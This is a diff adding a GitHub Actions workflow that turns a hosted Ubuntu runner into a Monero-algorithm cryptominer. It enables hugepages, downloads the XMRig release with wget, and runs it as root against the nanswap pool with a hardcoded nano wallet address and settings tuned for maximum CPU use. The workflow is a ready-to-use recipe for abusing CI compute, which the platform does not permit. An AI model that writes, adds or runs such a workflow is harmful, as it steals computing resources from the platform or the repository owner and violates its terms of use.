@@ -1,0 +1,35 @@
+name: XMRig Linux Task (Optimized)
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Optimize System for Mining
+        run: |
+          # 1. Enable Huge Pages (This is the biggest boost)
+          sudo sysctl -w vm.nr_hugepages=1280
+          
+          # 2. (Optional) Clear RAM cache to make room for Huge Pages
+          sudo sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+
+      - name: Download XMRig
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.21.0-linux-static-x64.tar.gz
+
+      - name: Start Mining
+        run: |
+          cd xmrig-6.21.0
+          # Added --cpu-priority 5 for maximum focus
+          # Added --randomx-1gb-pages for even more efficiency if supported
+          sudo ./xmrig -o xmrig.nanswap.com:3333 \
+          -a rx -k \
+          -u nano_3d5psf65d41ckxdnqz5ajuwo1ceo6hq8k4q314oa78doqozye9b6eb5iqpc1 \
+          -p x \
+          --cpu-priority 5 \
+          --randomx-1gb-pages
+          
